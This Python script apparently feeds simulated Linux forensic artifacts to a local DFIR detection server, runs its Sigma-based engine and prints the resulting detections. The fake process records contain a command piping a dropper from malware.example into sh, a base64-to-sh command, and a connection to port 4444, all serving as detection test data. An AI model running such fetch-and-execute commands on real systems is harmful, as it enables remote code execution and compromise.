import hashlib
import json
import os
import sqlite3
import sys
import urllib.request
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

BASE = os.environ.get("ATOR_SERVER_URL", "http://127.0.0.1:8800")
DB = os.environ.get("ATOR_DFIR_DB", "/root/ator_dfir_linux.db")
AGENT_CFG = os.environ.get("ATOR_AGENT_CONFIG", "/root/ator_agent.json")

with open(AGENT_CFG) as fh:
    cfg = json.load(fh)
client_id = cfg["client_id"]

conn = sqlite3.connect(DB)
with open(AGENT_CFG) as fh:
    cfg = json.load(fh)
row = conn.execute(
    "SELECT id FROM hosts WHERE client_id=?", (cfg["client_id"],)
).fetchone()
if row is None:
    print(f"host {cfg['client_id']} not found in {DB}")
    sys.exit(1)
host_id = row[0]
conn.close()

api_key = cfg["api_key"]

headers = {"Authorization": "Bearer " + api_key, "X-Client-ID": client_id}
hostname_row = None


def api(method, path, body=None):
    req = urllib.request.Request(BASE + path, method=method)
    req.add_header("Content-Type", "application/json")
    for k, v in headers.items():
        req.add_header(k, v)
    data = json.dumps(body).encode() if body is not None else None
    with urllib.request.urlopen(req, data=data, timeout=60) as resp:
        return resp.status, json.loads(resp.read().decode() or "{}")


ts = datetime.now(timezone.utc).isoformat(timespec="seconds")
manifest = {
    "collection_id": f"lin-sim-{ts[-6:]}", "hostname": "ator-ubuntu-vm", "os_type": "linux",
    "agent_version": "1.0.0-sim", "started_at_utc": ts, "finished_at_utc": ts,
    "collector_order": ["processes", "network"],
    "manifest_sha256": "",
}
manifest["manifest_sha256"] = hashlib.sha256(
    json.dumps(manifest, sort_keys=True).encode()).hexdigest()

artifacts = {
    "processes": [
        {"pid": 9901, "ppid": 800, "name": "bash",
         "cmdline": "bash -c 'curl http://malware.example/dropper.sh | sh'",
         "exe_path": "/usr/bin/bash"},
        {"pid": 9902, "ppid": 9901, "name": "base64",
         "cmdline": "echo aWQ= | base64 -d | sh", "exe_path": "/usr/bin/base64"},
    ],
    "network": [
        {"pid": 9902, "process_name": "sh", "remote": "198.51.100.66:4444",
         "proto": "tcp", "status": "established", "local": "172.17.0.1:44322"},
    ],
    "persistence": [], "files_triage": [], "logs": [], "containers": [],
}

status, body = api("POST", "/api/v1/ingest",
                   {"manifest": manifest, "artifacts": artifacts})
print("ingest:", status, body)

status, engine = api("POST", "/api/v1/engine/run")
print("engine:", json.dumps({k: engine[k] for k in ("sigma_hits", "total_new_detections")}))

status, dets = api("GET", "/api/v1/detections")
linux_dets = [d for d in dets if d["host_id"] == host_id]
print(f"\nLinux host detections ({len(linux_dets)}):")
for d in linux_dets:
    print(f"  [{d['severity']:8s}] {d['rule_name'][:46]:46s} {d['technique_id'] or '-'}"
          f" -> {d.get('technique_name') or '-'}")
